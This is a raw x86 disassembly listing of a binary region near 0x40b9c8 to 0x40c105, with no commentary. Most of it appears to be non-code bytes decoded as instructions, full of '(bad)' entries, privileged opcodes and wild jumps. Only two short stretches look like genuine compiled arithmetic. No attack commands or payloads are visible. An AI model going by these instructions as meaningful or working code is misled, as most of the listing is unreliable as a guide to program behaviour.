  40b9c8:	scas   al,BYTE PTR es:[edi]
  40b9c9:	mov    esp,0x4541af38
  40b9ce:	lock std 
  40b9d0:	xchg   ch,dh
  40b9d2:	popa   
  40b9d3:	out    0x20,al
  40b9d5:	dec    ebp
  40b9d6:	push   ebx
  40b9d7:	repz and edi,ebp
  40b9da:	loop   0x40b9cd
  40b9dc:	push   esi
  40b9dd:	fidiv  DWORD PTR [esi]
  40b9df:	je     0x40b96b
  40b9e1:	jb     0x40ba23
  40b9e3:	popa   
  40b9e4:	dec    esp
  40b9e5:	xor    eax,0x1cd3ac30
  40b9ea:	retf   
  40b9eb:	mov    eax,0x7ab99281
  40b9f0:	retf   
  40b9f1:	test   al,0xeb
  40b9f3:	push   cs
  40b9f4:	adc    BYTE PTR ds:[ebx+eiz*4],0x30
  40b9f9:	jae    0x40ba6b
  40b9fb:	addr16 add al,0xf6
  40b9fe:	or     esi,DWORD PTR [ebp-0x4c]
  40ba01:	cmp    eax,0x8a9881b8
  40ba06:	mov    cl,0xdc
  40ba08:	push   ebp
  40ba09:	nop
  40ba0a:	jno    0x40b9e3
  40ba0c:	jb     0x40ba21
  40ba0e:	inc    BYTE PTR [edx]
  40ba10:	stos   BYTE PTR es:[edi],al
  40ba11:	dec    ebx
  40ba12:	adc    al,0x4
  40ba14:	cmp    dh,ah
  40ba16:	test   DWORD PTR [esi],0xbdacc984
  40ba1c:	jae    0x40b9f9
  40ba1e:	add    ch,ch
  40ba20:	retf   0xd3a8
  40ba23:	sbb    eax,0x98520b2a
  40ba28:	or     edx,DWORD PTR [ebx+0x68ea5056]
  40ba2e:	push   ecx
  40ba2f:	test   BYTE PTR [ebp-0x18],ah
  40ba32:	(bad)  
  40ba33:	cmp    edi,DWORD PTR [eax]
  40ba35:	sbb    DWORD PTR [edi-0x540b34d8],eax
  40ba3b:	xor    BYTE PTR [ebp-0x2aa457bf],0xc5
  40ba42:	adc    eax,0xff5c8d35
  40ba47:	test   BYTE PTR [eax],al
  40ba49:	add    DWORD PTR [eax+0xa],edi
  40ba4c:	inc    edx
  40ba4d:	mov    edx,0xece4f3b4
  40ba52:	push   esp
  40ba53:	push   ecx
  40ba54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba55:	inc    eax
  40ba56:	ficomp DWORD PTR [eax]
  40ba58:	mov    dl,0xdf
  40ba5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba5b:	das    
  40ba5c:	ret    0x8d83
  40ba5f:	cmp    ch,bh
  40ba61:	sub    dh,BYTE PTR [ecx+ebp*4+0x48]
  40ba65:	add    eax,0xb6d4d811
  40ba6a:	or     esp,DWORD PTR [ecx]
  40ba6c:	add    al,ch
  40ba6e:	xor    eax,0x59c5ffc3
  40ba73:	add    eax,0x2995862e
  40ba78:	add    eax,DWORD PTR [ebx+0x7c36cf6f]
  40ba7e:	(bad)  [ebx-0x64ff2052]
  40ba84:	xchg   esp,eax
  40ba85:	sbb    BYTE PTR [edi+0x15e7e007],0x57
  40ba8c:	imul   ebp,DWORD PTR [ebp+0x78],0x43
  40ba90:	inc    edx
  40ba91:	push   esi
  40ba92:	loop   0x40baa3
  40ba94:	xchg   ebp,eax
  40ba95:	cmp    eax,0xa5ca4f8
  40ba9a:	mov    bh,0x45
  40ba9c:	jg     0x40babc
  40ba9e:	or     esp,DWORD PTR [ebp-0x2a]
  40baa1:	adc    esp,DWORD PTR [ebx-0x11a00491]
  40baa7:	mov    dl,0x72
  40baa9:	dec    edi
  40baaa:	pop    ecx
  40baab:	jbe    0x40bb2a
  40baad:	sbb    dh,bh
  40baaf:	stos   BYTE PTR es:[edi],al
  40bab0:	push   ds
  40bab1:	mov    dl,BYTE PTR [ebx+edx*2+0x47]
  40bab5:	inc    ebp
  40bab6:	shl    BYTE PTR [edi+0x13f70f55],0x78
  40babd:	xor    al,bh
  40babf:	push   eax
  40bac0:	out    dx,eax
  40bac1:	xchg   ebx,eax
  40bac2:	wbinvd 
  40bac4:	int    0xd9
  40bac6:	popf   
  40bac7:	sbb    DWORD PTR [eax],0xe5e9ddce
  40bacd:	dec    esi
  40bace:	scas   eax,DWORD PTR es:[edi]
  40bacf:	test   bl,dl
  40bad1:	aaa    
  40bad2:	inc    ebx
  40bad3:	push   ebp
  40bad4:	rcl    BYTE PTR [eax-0x62],cl
  40bad7:	mov    DWORD PTR [ebp+0x63822b7f],ebx
  40badd:	jmp    0xb2556873
  40bae2:	jo     0x40bb62
  40bae4:	mov    ch,0x52
  40bae6:	push   edx
  40bae7:	adc    bh,BYTE PTR [esi]
  40bae9:	adc    DWORD PTR [edx-0xa],ebx
  40baec:	test   BYTE PTR [ebx-0x288683ef],dl
  40baf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf3:	xor    BYTE PTR [ebp+0x42ff52b6],bl
  40baf9:	push   ebp
  40bafa:	cmp    bl,dh
  40bafc:	add    cl,BYTE PTR [ebp-0x685ec0fc]
  40bb02:	imul   edi,DWORD PTR [eax-0x56],0x2e8165a4
  40bb09:	sub    al,0x7b
  40bb0b:	out    dx,eax
  40bb0c:	mov    ch,0x7c
  40bb0e:	std    
  40bb0f:	cmp    bl,ah
  40bb11:	lea    esi,[edi+0x62]
  40bb14:	mov    DWORD PTR [ecx],edx
  40bb16:	popa   
  40bb17:	jns    0x40bb52
  40bb19:	sbb    BYTE PTR [eax-0x2286a08d],bh
  40bb1f:	jb     0x40bb6b
  40bb21:	fdivr  DWORD PTR [ebx]
  40bb23:	xchg   esp,eax
  40bb24:	add    BYTE PTR [ecx+0x75],cl
  40bb27:	mov    cl,0x98
  40bb29:	fdivr  DWORD PTR [edi+0x14]
  40bb2c:	lock scas eax,DWORD PTR es:[edi]
  40bb2e:	pop    ebx
  40bb2f:	repnz pop ecx
  40bb31:	pusha  
  40bb32:	dec    ecx
  40bb33:	or     DWORD PTR [esi+0x4c],esi
  40bb36:	int3   
  40bb37:	add    al,BYTE PTR [ebp-0x54]
  40bb3a:	sbb    ecx,DWORD PTR ds:0x8c08f059
  40bb40:	or     bh,cl
  40bb42:	xor    eax,0x7af08fe5
  40bb47:	inc    esi
  40bb48:	cdq    
  40bb49:	sub    DWORD PTR [edx],0xffffff92
  40bb4c:	mov    al,ds:0xe589ad9f
  40bb51:	hlt    
  40bb52:	inc    edx
  40bb53:	xor    eax,0x4b3e6da9
  40bb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb59:	ins    DWORD PTR es:[edi],dx
  40bb5a:	sar    BYTE PTR [edx-0x12],cl
  40bb5d:	or     bl,BYTE PTR ds:0x6d9ede82
  40bb63:	(bad)  
  40bb64:	push   ss
  40bb65:	mov    bl,0x3f
  40bb67:	push   edx
  40bb68:	adc    dh,0xf5
  40bb6b:	shr    dl,0x94
  40bb6e:	pop    esp
  40bb6f:	aas    
  40bb70:	jmp    0x40bb95
  40bb72:	push   esp
  40bb73:	add    eax,DWORD PTR [esi+0xb]
  40bb76:	loopne 0x40bb7c
  40bb78:	jge    0x40bbe1
  40bb7a:	mov    ds:0x6ea93ea1,al
  40bb7f:	cwde   
  40bb80:	push   ecx
  40bb81:	scas   eax,DWORD PTR es:[edi]
  40bb82:	nop
  40bb83:	or     eax,0x738395eb
  40bb88:	push   esi
  40bb89:	(bad)  
  40bb8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb8b:	xchg   ebx,eax
  40bb8c:	in     al,dx
  40bb8d:	loope  0x40bb97
  40bb8f:	loope  0x40bb9f
  40bb91:	and    cl,BYTE PTR [ecx-0x23]
  40bb94:	sub    eax,0xab573070
  40bb99:	dec    eax
  40bb9a:	aaa    
  40bb9b:	sub    al,0xc2
  40bb9d:	push   esp
  40bb9e:	pop    eax
  40bb9f:	push   esi
  40bba0:	add    BYTE PTR [esp+edi*8+0x7],al
  40bba4:	mov    ebx,gs
  40bba6:	shl    DWORD PTR [eax+0xf553860],0xf9
  40bbad:	lahf   
  40bbae:	out    dx,eax
  40bbaf:	mov    BYTE PTR [ecx+0x3f61b6b8],ch
  40bbb5:	mov    dl,0x87
  40bbb7:	rcl    ch,0xc4
  40bbba:	in     al,dx
  40bbbb:	lock es jo 0x40bb83
  40bbbf:	mov    cl,0x0
  40bbc1:	add    BYTE PTR [ebx-0x7f5cbc03],0xc4
  40bbc8:	dec    edx
  40bbc9:	neg    BYTE PTR ds:0x102695d0
  40bbcf:	bound  esi,QWORD PTR [esi+0x304fca05]
  40bbd5:	jnp    0x40bb80
  40bbd7:	jle    0x40bc34
  40bbd9:	add    al,0x8f
  40bbdb:	into   
  40bbdc:	mov    al,ds:0x27ad94a1
  40bbe1:	push   eax
  40bbe2:	fisubr WORD PTR [eax-0x5f]
  40bbe5:	and    ebp,esp
  40bbe7:	cld    
  40bbe8:	popf   
  40bbe9:	icebp  
  40bbea:	jge    0x40bc2c
  40bbec:	add    BYTE PTR [ebx],ch
  40bbee:	inc    ebx
  40bbef:	rcl    al,0xf3
  40bbf2:	shl    BYTE PTR [ecx-0x8],1
  40bbf5:	icebp  
  40bbf6:	sub    bh,BYTE PTR [edx+0x4302ac17]
  40bbfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbfd:	lock pusha 
  40bbff:	(bad)  
  40bc00:	retf   
  40bc01:	(bad)
  40bc04:	jns    0x40bc73
  40bc06:	mov    bh,0xfe
  40bc08:	cmp    al,0x55
  40bc0a:	and    edi,ecx
  40bc0c:	pop    ss
  40bc0d:	daa    
  40bc0e:	aas    
  40bc0f:	push   0x6a575ba3
  40bc14:	stos   BYTE PTR es:[edi],al
  40bc15:	push   ds
  40bc16:	jge    0x40bbdf
  40bc18:	add    ecx,ecx
  40bc1a:	mov    ebx,0x53afdc7c
  40bc1f:	bound  ebp,QWORD PTR [ecx+ebx*4]
  40bc22:	jg     0x40bc10
  40bc24:	sub    dl,BYTE PTR [edx+eax*8+0x1e]
  40bc28:	cmp    eax,0xa6739953
  40bc2d:	retf   
  40bc2e:	and    DWORD PTR [eax],ebx
  40bc30:	jb     0x40bc85
  40bc32:	cmc    
  40bc33:	fs out dx,eax
  40bc35:	xchg   edi,eax
  40bc36:	pusha  
  40bc37:	mov    ah,0xc7
  40bc39:	lahf   
  40bc3a:	les    esp,FWORD PTR [esi+0x4e29faa7]
  40bc40:	jmp    0x40bcbd
  40bc42:	jb     0x40bc6f
  40bc44:	push   edx
  40bc45:	loope  0x40bc9c
  40bc47:	cmp    eax,0xbefdad49
  40bc4c:	jg     0x40bc50
  40bc4e:	loopne 0x40bc16
  40bc50:	lods   al,BYTE PTR ds:[esi]
  40bc51:	adc    al,0x2a
  40bc53:	jnp    0x40bc43
  40bc55:	cld    
  40bc56:	cmp    BYTE PTR [esi+0x6c5262f9],ch
  40bc5c:	dec    ebx
  40bc5d:	sub    DWORD PTR ds:0x1eff9dad,ebp
  40bc63:	dec    ebp
  40bc64:	pop    ebx
  40bc65:	aam    0x62
  40bc67:	ins    DWORD PTR es:[edi],dx
  40bc68:	into   
  40bc69:	mov    ds:0x7ceb025e,eax
  40bc6e:	dec    eax
  40bc6f:	retf   
  40bc70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc71:	stos   DWORD PTR es:[edi],eax
  40bc72:	cld    
  40bc73:	sbb    DWORD PTR [eax-0x5a],eax
  40bc76:	jmp    0xa98dc80b
  40bc7b:	mov    ecx,0xed6323b0
  40bc80:	and    BYTE PTR [eax-0x76],bh
  40bc83:	pushf  
  40bc84:	dec    ebp
  40bc85:	mov    ebx,0xa4c6bec1
  40bc8a:	inc    esi
  40bc8b:	adc    al,0xa1
  40bc8d:	je     0x40bc69
  40bc8f:	(bad)  
  40bc90:	stos   DWORD PTR es:[edi],eax
  40bc91:	dec    edx
  40bc92:	jae    0x40bcf4
  40bc94:	xlat   BYTE PTR ds:[ebx]
  40bc95:	mul    BYTE PTR [edi+0x68eb52e3]
  40bc9b:	sub    BYTE PTR [ebp+0x7e90309a],cl
  40bca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bca2:	jp     0x40bc70
  40bca4:	iret   
  40bca5:	or     BYTE PTR [eax+0x69],bh
  40bca8:	out    dx,al
  40bca9:	mov    BYTE PTR [ebx-0x31],bh
  40bcac:	stc    
  40bcad:	cmp    al,0xc8
  40bcaf:	mov    al,0x33
  40bcb1:	push   0x25
  40bcb3:	mov    ds:0xbbd34b3c,eax
  40bcb8:	shl    DWORD PTR ds:[eax+ecx*2+0x5db0daf8],1
  40bcc0:	daa    
  40bcc1:	inc    esp
  40bcc2:	leave  
  40bcc3:	push   esp
  40bcc4:	xor    BYTE PTR [esi-0x6a],0x28
  40bcc8:	(bad)  
  40bcc9:	(bad)  
  40bcca:	lahf   
  40bccb:	nop
  40bccc:	aam    0xaa
  40bcce:	xchg   ebx,eax
  40bccf:	enter  0x4b30,0x1
  40bcd3:	loopne 0x40bcf0
  40bcd5:	pop    es
  40bcd6:	sbb    eax,0x66d6a03f
  40bcdb:	call   0x38dc:0xbca02d0d
  40bce2:	icebp  
  40bce3:	loop   0x40bc96
  40bce5:	sub    DWORD PTR [ebp+0x16f3c47b],ebx
  40bceb:	mov    ds:0x892dc436,al
  40bcf0:	mov    ebp,0x8b0b7834
  40bcf5:	pop    ebp
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    dl,BYTE PTR [edx]
  40bd3f:	and    DWORD PTR [ebp+0x23],eax
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd70
  40bd4b:	pop    edi
  40bd4c:	cli    
  40bd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4e:	mov    edx,0xc775cdd6
  40bd53:	pop    eax
  40bd54:	mov    ah,BYTE PTR [edx+eax*1]
  40bd57:	and    DWORD PTR [eax],0xffffff8d
  40bd5a:	popf   
  40bd5b:	div    DWORD PTR [esi+ebp*2]
  40bd5e:	nop
  40bd5f:	repz sub eax,0x6c81684f
  40bd65:	xchg   ebp,eax
  40bd66:	and    BYTE PTR [esi-0x5d8b7c63],ah
  40bd6c:	and    ecx,DWORD PTR [esi]
  40bd6e:	mov    BYTE PTR [ebx+0x77],dh
  40bd71:	sub    BYTE PTR [ecx-0x588afeaf],al
  40bd77:	mov    al,ds:0xacedbcc1
  40bd7d:	push   ss
  40bd7e:	mov    bh,BYTE PTR [edx+0x2baf7c8]
  40bd84:	or     DWORD PTR [esi-0x7],ecx
  40bd87:	rol    DWORD PTR [edi+0x25],cl
  40bd8a:	jle    0x40bd97
  40bd8c:	rcl    BYTE PTR [ebx+eiz*2-0x7a],1
  40bd90:	dec    eax
  40bd91:	sub    BYTE PTR [edi-0x77],cl
  40bd94:	lods   al,BYTE PTR ds:[esi]
  40bd95:	xlat   BYTE PTR ds:[ebx]
  40bd96:	test   cl,dl
  40bd98:	dec    eax
  40bd99:	sbb    dh,0x11
  40bd9c:	mov    ebp,0x94da7360
  40bda1:	test   eax,0x88f2bc82
  40bda6:	pop    edx
  40bda7:	mov    WORD PTR [esi],gs
  40bda9:	cmp    DWORD PTR fs:[edx+0x3649718],edi
  40bdb0:	aam    0xb3
  40bdb2:	data16 jl 0x40bd36
  40bdb5:	cld    
  40bdb6:	inc    ecx
  40bdb7:	sbb    DWORD PTR [ebx+0x20],esp
  40bdba:	es sbb eax,0xfec4559d
  40bdc0:	fbld   TBYTE PTR [edx]
  40bdc2:	leave  
  40bdc3:	retf   
  40bdc4:	and    al,0x30
  40bdc6:	bnd ret 
  40bdc8:	jns    0x40bdf1
  40bdca:	inc    edx
  40bdcb:	push   0x82809cba
  40bdd0:	mov    dl,0x1f
  40bdd2:	cmp    BYTE PTR [ebx-0x6b45c5a0],cl
  40bdd8:	aas    
  40bdd9:	mov    ebp,0x89f0a074
  40bdde:	add    BYTE PTR [ebp+eax*1-0x2aa44281],al
  40bde5:	mov    ecx,ds
  40bde7:	retf   0xa0da
  40bdea:	adc    ebp,edx
  40bdec:	jmp    0xd125e76c
  40bdf1:	lods   al,BYTE PTR ds:[esi]
  40bdf2:	fisub  DWORD PTR [esi+0x760c7e59]
  40bdf8:	cmp    eax,0x156823da
  40bdfd:	push   ebp
  40bdfe:	pop    eax
  40bdff:	mov    ch,0x3e
  40be01:	jo     0x40bdb9
  40be03:	test   DWORD PTR [ecx+0xe],edx
  40be06:	xchg   ecx,eax
  40be07:	xlat   BYTE PTR ds:[ebx]
  40be08:	or     eax,0xf34ae92a
  40be0d:	cld    
  40be0e:	fs aas 
  40be10:	adc    eax,0xbebed2f1
  40be15:	inc    ebx
  40be16:	into   
  40be17:	and    BYTE PTR [ebx+eax*4-0x298414bb],0x61
  40be1f:	jae    0x40be23
  40be21:	das    
  40be22:	or     al,0xe0
  40be24:	and    eax,0x2125f944
  40be29:	cld    
  40be2a:	dec    esp
  40be2b:	fistp  WORD PTR [ebx+0x2bad8e71]
  40be31:	jo     0x40be53
  40be33:	cmp    DWORD PTR [eax+0x77],esp
  40be36:	arpl   WORD PTR [esi],cx
  40be38:	fld    DWORD PTR [edx+0x5acb3e54]
  40be3e:	fs and eax,0x6921664a
  40be44:	mov    ds:0x9cda7538,al
  40be49:	mov    ecx,0x83620a7a
  40be4e:	mov    esi,0xd5d4e946
  40be53:	sbb    DWORD PTR [eax+ebx*1+0x5],eax
  40be57:	and    eax,DWORD PTR [eax+0xb]
  40be5a:	cli    
  40be5b:	xor    bl,cl
  40be5d:	jbe    0x40be84
  40be5f:	fs push eax
  40be61:	add    BYTE PTR [edi],dh
  40be63:	das    
  40be64:	fcmovne st,st(5)
  40be66:	jmp    0x8be0eaa4
  40be6b:	xchg   DWORD PTR [edi-0x474fd11d],ebx
  40be71:	inc    ecx
  40be72:	xchg   ebx,eax
  40be73:	pop    esi
  40be74:	jae    0x40be9f
  40be76:	mov    ecx,0x41f21b58
  40be7b:	lock cmp dh,BYTE PTR [edx+0x5f]
  40be7f:	or     DWORD PTR [edi+ebx*2],esi
  40be82:	xchg   esp,eax
  40be83:	loope  0x40be29
  40be85:	daa    
  40be86:	inc    esi
  40be87:	or     DWORD PTR [edi-0x622bf670],esp
  40be8d:	data16 fldl2t 
  40be90:	stos   DWORD PTR es:[edi],eax
  40be91:	ins    BYTE PTR es:[edi],dx
  40be92:	or     DWORD PTR [ebx-0x372c0f8f],esi
  40be98:	cmp    esp,eax
  40be9a:	or     dh,dl
  40be9c:	outs   dx,DWORD PTR ds:[esi]
  40be9d:	fstp   QWORD PTR ds:0xcdc87420
  40bea3:	jmp    0x4f92:0x3cc9c01
  40beaa:	out    0x15,eax
  40beac:	data16 js 0x40bf02
  40beaf:	sbb    BYTE PTR [edi+0x6d],al
  40beb2:	push   ss
  40beb3:	into   
  40beb4:	(bad)  
  40beb5:	adc    edx,eax
  40beb7:	ss icebp 
  40beb9:	sbb    BYTE PTR [esi+ebx*8-0x24d658f9],bh
  40bec0:	in     al,dx
  40bec1:	mov    bl,0xf9
  40bec3:	dec    edi
  40bec4:	xchg   ecx,eax
  40bec5:	iret   
  40bec6:	adc    edx,DWORD PTR [edx-0x47f4b86]
  40becc:	(bad)  
  40becd:	mov    dh,0x4b
  40becf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bed0:	fcmovbe st,st(5)
  40bed2:	scas   al,BYTE PTR es:[edi]
  40bed3:	(bad)  
  40bed4:	fmul   QWORD PTR ds:0xf9118801
  40beda:	sub    DWORD PTR [ebp-0x10],0xb35c7ae7
  40bee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bee2:	xlat   BYTE PTR ds:[ebx]
  40bee3:	cmp    bl,BYTE PTR [edi+0x47267b2b]
  40bee9:	test   ah,cl
  40beeb:	sub    al,0xa6
  40beed:	inc    ebx
  40beee:	inc    esp
  40beef:	xor    DWORD PTR [ecx-0x1ec1a9f9],esi
  40bef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef6:	pop    ss
  40bef7:	sar    edi,0x51
  40befa:	adc    BYTE PTR [edx-0x26],0xe1
  40befe:	push   edi
  40beff:	popa   
  40bf00:	mov    esp,0x3ae31cd7
  40bf05:	mov    al,ah
  40bf07:	pushf  
  40bf08:	inc    esp
  40bf09:	push   esp
  40bf0a:	ds push ebp
  40bf0c:	rol    bh,cl
  40bf0e:	jl     0x40bed1
  40bf10:	sub    DWORD PTR [ecx],ebp
  40bf12:	ret    
  40bf13:	push   ss
  40bf14:	xchg   ebp,eax
  40bf15:	push   DWORD PTR gs:[edx]
  40bf18:	jl     0x40bf19
  40bf1a:	jae    0x40bf17
  40bf1c:	push   esp
  40bf1d:	into   
  40bf1e:	repz adc edi,eax
  40bf21:	setg   BYTE PTR [ebp+0x75]
  40bf25:	sbb    eax,0x815b1ff5
  40bf2a:	pusha  
  40bf2b:	mov    ebp,0x95d52bae
  40bf30:	mov    ebp,0x201a724b
  40bf35:	bound  edx,QWORD PTR ds:0x97d96213
  40bf3b:	cmp    dh,BYTE PTR ds:0x5a66756b
  40bf41:	loope  0x40bfbd
  40bf43:	add    BYTE PTR [ecx],dl
  40bf45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf46:	push   0x7dfa7493
  40bf4b:	popa   
  40bf4c:	pop    edx
  40bf4d:	inc    edi
  40bf4e:	cld    
  40bf4f:	mov    edi,0xefdb205b
  40bf54:	mov    ch,0x8e
  40bf56:	dec    ebp
  40bf57:	jmp    0x82da6055
  40bf5c:	jno    0x40bfdd
  40bf5e:	inc    ecx
  40bf5f:	xor    cl,BYTE PTR [edi+0x83d4fbe]
  40bf65:	add    BYTE PTR [ebx+0x2ab9b7cf],al
  40bf6b:	scas   eax,DWORD PTR es:[edi]
  40bf6c:	sbb    bh,bl
  40bf6e:	dec    eax
  40bf6f:	push   ss
  40bf70:	push   edi
  40bf71:	mov    al,ds:0x1a5ccdfd
  40bf76:	push   ss
  40bf77:	data16 jbe 0x40bf5a
  40bf7a:	push   ds
  40bf7b:	jo     0x40bf80
  40bf7d:	cli    
  40bf7e:	and    ch,BYTE PTR [ecx]
  40bf80:	fdiv   st,st(1)
  40bf82:	scas   eax,DWORD PTR es:[edi]
  40bf83:	mov    al,ds:0xd31d4460
  40bf88:	rol    DWORD PTR [ebx+0x32],cl
  40bf8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf8c:	or     BYTE PTR ds:0x32398f85,0xe8
  40bf93:	test   eax,0x8a7d2b9c
  40bf98:	push   esi
  40bf99:	fidivr DWORD PTR [bp+si+0x55]
  40bf9d:	xor    ch,BYTE PTR [ebx+edx*8]
  40bfa0:	and    ah,dh
  40bfa2:	sti    
  40bfa3:	call   0x31e457a2
  40bfa8:	adc    BYTE PTR [esi-0x36],ch
  40bfab:	adc    esi,DWORD PTR ds:0xc365ccca
  40bfb1:	push   es
  40bfb2:	call   DWORD PTR [ebx+esi*4+0x4f]
  40bfb6:	je     0x40bf70
  40bfb8:	push   ebp
  40bfb9:	call   0x9c00f058
  40bfbe:	sbb    eax,0xc6ef1f
  40bfc3:	ret    
  40bfc4:	pushf  
  40bfc5:	stos   DWORD PTR es:[edi],eax
  40bfc6:	fs retf 
  40bfc8:	push   edx
  40bfc9:	out    dx,eax
  40bfca:	sbb    BYTE PTR [ebx-0x1e7faa27],bh
  40bfd0:	rol    BYTE PTR [esi],cl
  40bfd2:	fmul   QWORD PTR [esp+edx*2]
  40bfd5:	or     eax,0xde241cde
  40bfda:	dec    edi
  40bfdb:	cs ins DWORD PTR es:[edi],dx
  40bfdd:	xlat   BYTE PTR ds:[ebx]
  40bfde:	mov    bl,0x4f
  40bfe0:	fidiv  WORD PTR [edx]
  40bfe2:	lock add al,0xa7
  40bfe5:	mov    DWORD PTR ss:[eax],edi
  40bfe8:	pop    ebp
  40bfe9:	mov    ch,0x79
  40bfeb:	bound  eax,QWORD PTR [eax]
  40bfed:	mov    ebx,0xefe6afad
  40bff2:	cdq    
  40bff3:	lds    edx,FWORD PTR [ebp-0x61]
  40bff6:	mov    esi,DWORD PTR [eax-0x493576e]
  40bffc:	shl    DWORD PTR [edx],0x9e
  40bfff:	mov    edx,0xa7fbac5e
  40c004:	dec    edi
  40c005:	xor    dh,BYTE PTR [esi]
  40c007:	push   esp
  40c008:	mov    cl,0xc4
  40c00a:	out    dx,eax
  40c00b:	or     al,0x0
  40c00d:	cmp    DWORD PTR [ecx+0x1c],esp
  40c010:	pop    edx
  40c011:	mov    edx,0x68d55ed5
  40c016:	scas   al,BYTE PTR es:[edi]
  40c017:	inc    esi
  40c018:	jns    0x40c07f
  40c01a:	inc    ebp
  40c01b:	dec    ecx
  40c01c:	(bad)  
  40c01d:	fbstp  TBYTE PTR [eax-0xc]
  40c020:	jmp    0xc5c88fa2
  40c025:	xchg   edi,eax
  40c026:	xor    al,0xcc
  40c028:	(bad)  
  40c029:	(bad)  
  40c02a:	jmp    0x40c01c
  40c02c:	xchg   DWORD PTR [ecx+edi*4],ebx
  40c02f:	pop    ecx
  40c030:	rcl    DWORD PTR [ebp+ebp*2-0x4a],0xb0
  40c035:	inc    esp
  40c036:	xchg   esp,eax
  40c037:	mov    gs,WORD PTR ds:0x648e1958
  40c03d:	adc    al,ah
  40c03f:	inc    ebp
  40c040:	stos   BYTE PTR es:[edi],al
  40c041:	cmp    al,0xbd
  40c043:	stos   DWORD PTR es:[edi],eax
  40c044:	rcl    DWORD PTR [ebx-0x4f],cl
  40c047:	scas   eax,DWORD PTR es:[edi]
  40c048:	pushf  
  40c049:	mov    al,0x4b
  40c04b:	and    BYTE PTR [ecx-0x5c],al
  40c04e:	inc    edi
  40c04f:	nop
  40c050:	mov    WORD PTR [eax],?
  40c052:	pop    eax
  40c053:	loope  0x40bffe
  40c055:	fsubr  QWORD PTR [edx+ecx*2-0x5dd490d8]
  40c05c:	pop    ebp
  40c05d:	aam    0x18
  40c05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c060:	and    BYTE PTR [ebx+0x45d76625],ah
  40c066:	adc    eax,0xe790190d
  40c06b:	mov    ebx,0xbe8e940b
  40c070:	loop   0x40c03c
  40c072:	cmp    ebp,DWORD PTR [edx+0x7015739f]
  40c078:	add    ebx,edx
  40c07a:	(bad)  
  40c07b:	mov    al,0x61
  40c07d:	sub    edi,DWORD PTR [edx+0x2d]
  40c080:	aam    0xc9
  40c082:	or     eax,0x8c76f233
  40c087:	jne    0x40c01b
  40c089:	xchg   esp,eax
  40c08a:	(bad)  
  40c08b:	mov    esp,0x5d49ddfb
  40c090:	sbb    BYTE PTR [edx+0x74],cl
  40c093:	aaa    
  40c094:	int    0xe
  40c096:	add    eax,0x4d9834c7
  40c09b:	(bad)  
  40c09c:	fistp  QWORD PTR [esi+0x50a17e98]
  40c0a2:	and    al,0xb1
  40c0a4:	push   es
  40c0a5:	fld    QWORD PTR [ebx-0x3ecdf5ee]
  40c0ab:	jae    0x40c084
  40c0ad:	je     0x40c0b5
  40c0af:	cmp    eax,0xc682726b
  40c0b4:	loopne 0x40c114
  40c0b6:	iret   
  40c0b7:	cmp    ah,0xca
  40c0ba:	adc    al,0x47
  40c0bc:	ja     0x40c10c
  40c0be:	or     BYTE PTR [edx-0x1c3140ec],cl
  40c0c4:	dec    ebx
  40c0c5:	fwait
  40c0c6:	jns    0x40c0b5
  40c0c8:	jg     0x40c08e
  40c0ca:	test   esi,ebx
  40c0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0cd:	adc    dl,BYTE PTR [ecx-0x3d]
  40c0d0:	std    
  40c0d1:	scas   eax,DWORD PTR es:[edi]
  40c0d2:	sub    ebx,eax
  40c0d4:	push   edi
  40c0d5:	shl    BYTE PTR [ebx],0x55
  40c0d8:	ret    0x14c6
  40c0db:	and    al,0x44
  40c0dd:	iret   
  40c0de:	mov    al,ds:0xc2a64e1a
  40c0e3:	retf   
  40c0e4:	ds sti 
  40c0e6:	push   esp
  40c0e7:	outs   dx,BYTE PTR ds:[esi]
  40c0e8:	aad    0x28
  40c0ea:	mov    eax,ds:0x8bc4558b
  40c0ef:	jge    0x40c0ed
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
